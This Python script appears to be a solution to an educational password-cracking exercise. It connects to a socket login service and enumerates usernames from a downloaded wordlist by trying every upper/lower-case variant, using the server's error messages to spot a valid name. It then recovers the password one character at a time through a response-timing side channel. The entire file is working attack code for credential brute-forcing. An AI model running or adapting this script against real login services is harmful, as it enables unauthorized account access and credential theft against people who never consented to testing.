import socket
import sys
import requests
import json
import string
from datetime import datetime


def get_word_dict():
    url = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'

    res = requests.get(url)
    if res.status_code == 200:
        return list(res.text.split())


def word_comb_gen(wrd):
    for i in range(pow(2, len(wrd))):
        alp = wrd
        idx = 0
        while i:
            rem, i = i % 2, i // 2
            if rem:
                alp = alp[:idx] + alp[idx].upper() + alp[idx + 1:]
            idx += 1
        yield alp


def find_login(my_sock, pass_gen):
    log_pas = {"login": '', "password": ' '}
    for word in pass_gen:
        for log in word_comb_gen(word.lower()):

            log_pas["login"] = ''.join(log)
            pwd_json = json.dumps(log_pas)

            my_sock.send(pwd_json.encode())
            response = json.loads(my_sock.recv(1024).decode())

            if response["result"] == "Wrong password!":
                return log_pas
    return {"login": '', "password": ' '}


def find_password(my_sock, log_pass):
    alphabet = string.ascii_letters + string.digits
    pass_ret = ''
    while True:
        for simb in alphabet:
            log_pass['password'] = pass_ret + simb

            pwd_json = json.dumps(log_pass)

            start = datetime.now()

            my_sock.send(pwd_json.encode())
            response = json.loads(my_sock.recv(1024).decode())

            finish = datetime.now()
            difference = finish - start

            # if response['result'] == 'Exception happened during login':
            if difference.microseconds > 100000:
                pass_ret += simb
                break
            if response['result'] == 'Connection success!':
                return log_pass


with socket.socket() as my_socket:
    my_socket.connect((sys.argv[1], int(sys.argv[2])))
    crd = find_login(my_socket, get_word_dict())
    if crd['login'] != '':
        print(json.dumps(find_password(my_socket, crd)))

